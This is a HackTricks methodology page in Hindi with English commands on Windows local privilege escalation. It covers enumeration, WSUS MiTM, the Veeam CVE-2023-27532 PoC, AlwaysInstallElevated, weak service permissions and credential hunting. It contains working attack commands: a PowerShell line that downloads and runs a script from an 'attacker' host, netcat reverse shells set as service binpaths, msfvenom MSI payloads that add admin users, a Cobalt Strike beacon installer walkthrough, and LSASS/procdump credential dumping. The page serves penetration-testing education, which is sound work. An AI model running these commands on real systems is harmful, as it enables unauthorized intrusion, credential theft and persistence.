# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारम्भिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या होते हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में विभिन्न ऐसी चीज़ें हैं जो आपको **सिस्टम का enumeration करने** से रोक सकती हैं, executables चलाने से रोक सकती हैं या यहाँ तक कि आपकी **गतिविधियों का पता लगाने** में सक्षम हो सकती हैं। आपको privilege escalation enumeration शुरू करने से पहले निम्न **पृष्ठ** को **पढ़ना** चाहिए और इन सभी **रक्षा-तंत्रों** को **enumerate** करना चाहिए:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` को AppInfo secure-path checks bypass होने पर prompts के बिना High IL तक पहुँचने के लिए अभद्रित (abuse) किया जा सकता है। इस विषय पर समर्पित UIAccess/Admin Protection bypass workflow यहाँ देखें:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation का दुरुपयोग arbitrary SYSTEM registry write (RegPwn) के लिए किया जा सकता है:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

## System Info

### Version info enumeration

जाँच करें कि क्या उस Windows version में कोई ज्ञात vulnerability है (लागू किए गए patches को भी जाँचें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft सुरक्षा कमजोरियों के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस डेटाबेस में 4,700 से अधिक सुरक्षा कमजोरियाँ हैं, जो दिखाती हैं कि Windows environment कितना **विशाल attack surface** प्रदान करता है।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson एम्बेडेड है)_

**स्थानीय रूप से system information के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy जानकारी env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript फ़ाइलें

आप यह सीख सकते हैं कि इसे कैसे चालू किया जाए: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन निष्पादन के विवरण रिकॉर्ड किए जाते हैं, जिनमें चलाए गए कमांड, कमांड इनवोकेशन और स्क्रिप्ट के हिस्से शामिल हैं। हालांकि, पूरा निष्पादन विवरण और आउटपुट परिणाम कुल मिलाकर कैप्चर न हो सकें।

इसे सक्षम करने के लिए, दस्तावेज़ीकरण के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, और **"Module Logging"** को **"Powershell Transcription"** के बजाय चुनें।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell logs से आखिरी 15 events देखने के लिए आप इसे चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script के निष्पादन की संपूर्ण गतिविधि और पूर्ण सामग्री रिकॉर्ड कैप्चर की जाती है, जिससे यह सुनिश्चित होता है कि हर block of code अपने चलने के समय दस्तावेज़ित होता है। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक audit trail संरक्षित करती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों का दस्तावेजीकरण करके, प्रक्रिया के बारे में विस्तृत अंतर्दृष्टि प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग इवेंट्स को Windows Event Viewer में इस पथ पर देखा जा सकता है: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\\
अंतिम 20 इवेंट्स देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट http**S** के बजाय http के माध्यम से अनुरोध किए जाते हैं तो आप सिस्टम समझौता कर सकते हैं।

आप यह जाँच कर के शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग कर रहा है या नहीं, cmd में निम्नलिखित चलाकर:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इनमें से किसी जैसा उत्तर प्राप्त होता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **तो यह शोषण योग्य है।** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In order to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> यदि हमारे पास अपने स्थानीय user proxy को संशोधित करने की क्षमता है, और Windows Updates Internet Explorer की settings में कॉन्फ़िगर किए गए proxy का उपयोग करता है, तो हम स्थानीय रूप से [PyWSUS](https://github.com/GoSecure/pywsus) चला कर अपने ट्रैफ़िक को इंटरसेप्ट कर सकते हैं और हमारे asset पर elevated user के रूप में कोड चला सकते हैं।
>
> इसके अलावा, चूँकि WSUS सर्विस current user की settings का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और इस प्रमाणपत्र को current user के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट कर पाएंगे। WSUS certificate पर trust-on-first-use प्रकार की वैलिडेशन लागू करने के लिए किसी HSTS-like mechanism का उपयोग नहीं करता। यदि प्रस्तुत किया गया certificate user द्वारा trusted है और उसके पास सही hostname है, तो यह सर्विस द्वारा स्वीकार कर लिया जाएगा।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update चैनल एक्सपोज़ करते हैं। यदि enrollment को एक attacker सर्वर की ओर मजबूर किया जा सके और updater किसी rogue root CA या कमजोर signer checks पर भरोसा करता हो, तो एक local user एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM service इंस्टॉल कर देती है। एक सामान्यीकृत तकनीक (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` एक localhost service को **TCP/9401** पर एक्सपोज़ करता है जो attacker-controlled messages को प्रोसेस करता है, जिससे arbitrary commands **NT AUTHORITY\SYSTEM** के रूप में चलाए जा सकते हैं।

- **Recon**: listener और version की पुष्टि करें, उदाहरण के लिए `netstat -ano | findstr 9401` और `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: उसी डायरेक्टरी में आवश्यक Veeam DLLs के साथ `VeeamHax.exe` जैसे PoC को रखें, फिर लोकल सॉकेट पर एक SYSTEM payload ट्रिगर करें:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
The service कमांड को SYSTEM के रूप में निष्पादित करती है।

## KrbRelayUp

Windows **domain** environments के कुछ विशिष्ट परिस्थितियों में एक **local privilege escalation** vulnerability मौजूद है। इन परिस्थितियों में शामिल हैं ऐसे परिवेश जहाँ **LDAP signing is not enforced,** users के पास self-rights हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और users को domain के भीतर कंप्यूटर बनाने की क्षमता है। यह ध्यान देने योग्य है कि ये **requirements** **default settings** का उपयोग करके पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** ये 2 registers **enabled** (value is **0x1**), तो किसी भी privilege के users `*.msi` फाइलों को NT AUTHORITY\\**SYSTEM** के रूप में **install** (execute) कर सकते हैं।
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास एक meterpreter session है, तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं।

### PowerUP

वर्तमान निर्देशिका के अंदर अधिकार बढ़ाने के लिए Windows MSI बाइनरी बनाने के लिए power-up से `Write-UserAddMSI` कमांड का उपयोग करें। यह स्क्रिप्ट एक precompiled MSI इंस्टॉलर लिखती है जो user/group जोड़ने के लिए प्रॉम्प्ट करती है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
बस बनाए गए binary को execute करें ताकि privileges escalate हों।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX के साथ MSI बनाना

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio के साथ MSI बनाना

- Cobalt Strike या Metasploit का उपयोग करके `C:\privesc\beacon.exe` में एक नया Windows EXE TCP payload जनरेट करें
- **Visual Studio** खोलें, **Create a new project** चुनें और खोज बॉक्स में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट को एक नाम दें, जैसे **AlwaysPrivesc**, स्थान के लिए **`C:\privesc`** उपयोग करें, **place solution and project in the same directory** चुनें, और **Create** पर क्लिक करें।
- **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर न पहुँचें। **Add** पर क्लिक करें और अभी जो Beacon payload जनरेट किया था उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- अन्य properties भी हैं जिन्हें आप बदल सकते हैं, जैसे **Author** और **Manufacturer**, जो installed app को अधिक legitimate दिखा सकते हैं।
- प्रोजेक्ट पर राइट-क्लिक करें और **View > Custom Actions** चुनें।
- **Install** पर राइट-क्लिक करें और **Add Custom Action** चुनें।
- **Application Folder** पर डबल-क्लिक करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे यह सुनिश्चित होगा कि installer रन होते ही beacon payload execute हो जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, इसे **build** करें।
- यदि चेतावनी `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे, तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

To execute the **installation** of the malicious `.msi` file in **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **लॉग** किया जा रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** का उद्देश्य **स्थानीय Administrator पासवर्ड का प्रबंधन** है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड **अद्वितीय, यादृच्छिक, और नियमित रूप से अपडेट किया गया** हो उन कंप्यूटरों पर जो domain से जुड़े हैं। ये पासवर्ड Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल उन उपयोगकर्ताओं द्वारा एक्सेस किए जा सकते हैं जिन्हें ACLs के माध्यम से पर्याप्त permissions प्रदान किए गए हों, जिससे अधिकृत होने पर वे local admin passwords देख सकते हैं।


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से शुरू होकर, Microsoft ने Local Security Authority (LSA) के लिए सुरक्षा बढ़ाई ताकि अनविश्वसनीय प्रक्रियाओं के उन प्रयासों को **रोक** सके जो इसकी मेमोरी **पढ़ने** या inject code करने के लिए होते हैं, जिससे सिस्टम और अधिक सुरक्षित हुआ।\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection)
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** Windows 10 में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash attacks जैसे खतरों से सुरक्षित करना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** का प्रमाणीकरण **Local Security Authority** (LSA) द्वारा किया जाता है और इन्हें ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता के लॉगऑन डेटा का प्रमाणीकरण एक registered security package द्वारा किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित कर दिए जाते हैं।\
[**Cached Credentials के बारे में अधिक जानकारी यहाँ**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ता और समूह की सूची बनाना

आपको यह जांचना चाहिए कि जिन समूहों का आप हिस्सा हैं उनमें से किसी के पास रोचक अनुमतियाँ तो नहीं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

**यदि आप किसी विशेषाधिकार समूह के सदस्य हैं तो आप विशेषाधिकार बढ़ा सकते हैं।** जानें कि विशेषाधिकार समूह क्या हैं और उन्हें दुरुपयोग करके विशेषाधिकार कैसे बढ़ाएं यहाँ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**और अधिक जानें** कि इस पृष्ठ पर **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **रोचक tokens के बारे में जानें** और उन्हें दुरुपयोग कैसे करें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग किए गए उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं की सूची बनाते समय **प्रक्रिया के command line के अंदर पासवर्ड की जाँच करें**.\

जांचें कि क्या आप **किसी चल रहे binary को overwrite कर सकते हैं** या क्या आपके पास binary फ़ोल्डर की write permissions हैं ताकि संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का शोषण किया जा सके:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा जांचें कि संभवतः [**electron/cef/chromium debuggers** चल रहे हों — आप इसका दुरुपयोग करके escalate privileges कर सकते हैं](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**प्रोसेस बाइनरीज़ के permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फ़ोल्डरों की permissions की जाँच (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप चल रही प्रक्रिया का memory dump sysinternals के **procdump** से बना सकते हैं। FTP जैसी सेवाओं के memory में **credentials in clear text in memory** होते हैं — memory को dump करके उन credentials को पढ़ें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI ऐप्स

**SYSTEM के रूप में चलने वाले एप्लिकेशन उपयोगकर्ता को CMD spawn करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers Windows को अनुमति देते हैं कि जब कुछ शर्तें पूरी हों (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, आदि) तो वह एक service शुरू कर सके। SERVICE_START rights के बिना भी आप अक्सर privileged services को उनके triggers को fire करके start कर सकते हैं। enumeration and activation techniques यहाँ देखें:

-
{{#ref}}
service-triggers.md
{{#endref}}

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं।
```bash
sc qc <service_name>
```
यह अनुशंसा की जाती है कि प्रत्येक सेवा के लिए आवश्यक privilege level की जाँच करने के लिए _Sysinternals_ का binary **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
अनुशंसा की जाती है कि जांचें कि क्या "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

अगर आपको यह त्रुटि मिल रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्नलिखित का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान रखें कि सेवा upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (for XP SP1)**

**Another workaround** इस समस्या का एक और उपाय है, इसे चलाएँ:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ बदलें**

उस परिदृश्य में जहाँ "Authenticated users" समूह के पास किसी सर्विस पर **SERVICE_ALL_ACCESS** है, सर्विस की executable बाइनरी को संशोधित करना संभव है। इसे संशोधित करने और **sc** चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges विभिन्न permissions के माध्यम से escalate किए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: service binary को reconfigure करने की अनुमति देता है।
- **WRITE_DAC**: permissions को reconfigure करने में सक्षम बनाता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership हासिल करने और permissions को reconfigure करने की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता मिलती है।
- **GENERIC_ALL**: service configurations बदलने की क्षमता भी मिलती है।

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Services binaries weak permissions

**जाँचें कि क्या आप उस binary को modify कर सकते हैं जिसे कोई service execute करता है** या क्या आपके पास **write permissions on the folder** हैं जहाँ binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
You can get every binary that is executed by a service using **wmic** (not in system32) and check your permissions using **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको जाँच करनी चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप निम्नलिखित करके किसी सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जाँच** सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जांचना चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। अगर ऐसा है, तो service द्वारा execute की जाने वाली binary को बदला जा सकता है।

execute की जाने वाली binary के Path को बदलने के लिए:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry symlink race to arbitrary HKLM value write (ATConfig)

Some Windows Accessibility features create per-user **ATConfig** keys that are later copied by a **SYSTEM** process into an HKLM session key. A registry **symbolic link race** can redirect that privileged write into **any HKLM path**, giving an arbitrary HKLM **value write** primitive.

Key locations (example: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` में इंस्टॉल की गई accessibility features सूचीबद्ध होती हैं।
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` में user-controlled configuration स्टोर होता है।
